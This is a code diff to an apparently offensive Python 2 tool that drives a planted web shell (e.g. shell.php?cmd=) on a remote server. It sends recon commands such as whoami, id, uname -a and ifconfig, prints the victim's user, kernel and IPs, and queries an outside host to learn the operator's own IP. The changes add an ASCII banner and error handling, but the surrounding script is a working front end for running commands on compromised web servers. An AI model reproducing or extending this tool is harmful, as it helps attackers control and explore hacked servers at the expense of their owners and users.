@@ -15,27 +15,43 @@ class Commander(object):
         self.info = None
         self.cmd = 'whoami;id;uname -a;pwd;/sbin/ifconfig |grep -B1 "inet addr" |awk \'{ if ( $1 == "inet" ) { print $2 } else if ( $2 == "Link" ) { printf "%s:" ,$1 } }\' |awk -F: \'{ print $3 }\''.replace(' ','%20')
 
+    @staticmethod
+    def banner():
+        return """\033[93m
+         __       ______   ______   .___  ___. .___  ___.      ___      .__   __.  _______
+        |  |     /      | /  __  \  |   \/   | |   \/   |     /   \     |  \ |  | |       \\
+        |  |    |  ,----'|  |  |  | |  \  /  | |  \  /  |    /  ^  \    |   \|  | |  .--.  |
+        |  |    |  |     |  |  |  | |  |\/|  | |  |\/|  |   /  /_\  \   |  . `  | |  |  |  |
+        |  |    |  `----.|  `--'  | |  |  |  | |  |  |  |  /  _____  \  |  |\   | |  '--'  |
+        |__|     \______| \______/  |__|  |__| |__|  |__| /__/     \__\ |__| \__| |_______/
+        ------------------------------------------------------------------------------------\033[0m"""
+
     def ServerInfo(self):
-        self.source = source = map(str.strip, urlopen('%s%s' % (self.url, self.cmd)).readlines())
+        print Commander.banner()
+        try:
+            self.source = source = map(str.strip, urlopen('%s%s' % (self.url, self.cmd)).readlines())
+        except urllib2.HTTPError:
+            print '\n[!] Invalid URL.'
+            exit(1)
         try:
             local_ip = (urlopen('http://85.214.27.38/show_my_ip').readlines())[0].split(':')[1].strip()
         except urllib2.URLError:
             local_ip = 'Unknown'
         available_commands = ['exit', 'clear', 'history', 'info']
         self.info = \
-        '''\033[92m
-        %s
-        User     : %s
-        ID       : %s
-        Kernel   : %s
-        CWD      : %s
-        Host IPs : %s
-        Local IP : %s
-        %s
-        \033[0m
+        '''
+
+        \033[91mUser\033[0m     :  \033[92m%s\033[0m
+        \033[91mID\033[0m       :  \033[92m%s\033[0m
+        \033[91mKernel\033[0m   :  \033[92m%s\033[0m
+        \033[91mCWD\033[0m      :  \033[92m%s\033[0m
+        \033[91mHost IPs\033[0m :  \033[92m%s\033[0m
+        \033[91mLocal IP\033[0m :  \033[92m%s\033[0m
+        ---------------------------------------------------------------------------------------------------------
+
         \033[97m[+] Available commands: %s.\033[0m
         \033[97m[+] Inserting\033[0m \033[91m!\033[0m \033[97mat the begining of the command will execute it on your box.\033[0m
-        ''' % ('-'*100, source[0], source[1], source[2], source[3], ', '.join(source[4:]), local_ip, '-'*100, available_commands)
+        ''' % (source[0], source[1], source[2], source[3], ', '.join(source[4:]), local_ip, available_commands)
         print self.info
 
     @staticmethod
@@ -77,7 +93,7 @@ class Commander(object):
 
 def main():
     if len(argv) != 2:
-        print '\n[+] Usage  : %s Shell_URL\n[!] Example: %s http://www.test.com/shell.php?cmd=' % ((argv[0], )*2)
+        print '\n[+] Usage : %s Shell_URL\n[!] Example: %s http://www.test.com/shell.php?cmd=' % ((argv[0], )*2)
         exit(1)
 
     else:
